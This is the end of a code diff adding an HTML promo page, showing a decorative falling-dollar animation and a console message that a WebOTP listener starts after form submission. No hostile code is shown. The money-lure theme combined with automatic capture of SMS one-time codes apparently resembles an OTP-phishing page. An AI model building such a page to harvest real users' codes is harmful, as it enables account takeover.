+                }, 3000);
+            });
+
+            // ─── INIT: DOLLAR RAIN ───
+            (function createDollarRain() {
+                const container = document.getElementById('dollar-rain');
+                const symbols = ['$', '💰', '💵', '💲'];
+                for (let i = 0; i < 35; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'dollar';
+                    el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.fontSize = (14 + Math.random() * 20) + 'px';
+                    el.style.animationDuration = (10 + Math.random() * 20) + 's';
+                    el.style.animationDelay = (Math.random() * 15) + 's';
+                    container.appendChild(el);
+                }
+            })();
+
+            console.log('🚀 Promo page ready. WebOTP listener will start after form submission.');
+
+        })();
+    </script>
+</body>
+</html>
